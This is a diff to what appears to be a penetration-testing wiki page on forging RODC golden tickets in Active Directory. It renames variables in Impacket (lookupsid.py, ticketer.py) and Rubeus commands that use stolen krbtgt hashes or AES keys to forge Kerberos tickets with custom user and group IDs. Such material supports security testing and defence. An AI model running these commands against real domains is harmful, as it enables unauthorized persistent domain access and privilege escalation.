@@ -28,13 +28,13 @@ There are [Impacket](https://github.com/fortra/impacket) scripts for each step o
 lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
 
 # Create the RODC golden ticket (with an RC4 key, i.e. NT hash)
-ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"
+ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" $USER
 
 # Create the RODC golden ticket (with an AES 128/256bits key)
-ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"
+ticketer.py -aesKey "$KRBTGT_AES_KEY" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" $USER
 
 # Create the RODC golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
-ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
+ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" -user-id "$USER_RID" -groups "$GROUPID1,$GROUPID2,..." $USER
 ```
 
 
@@ -44,7 +44,7 @@ From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be 
 
 
 ```powershell
-Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID
+Rubeus.exe golden /rodcNumber:$RODC_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:$USER /id:$USER_RID /domain:$DOMAIN /sid:$DOMAIN_SID
 ```
 
 
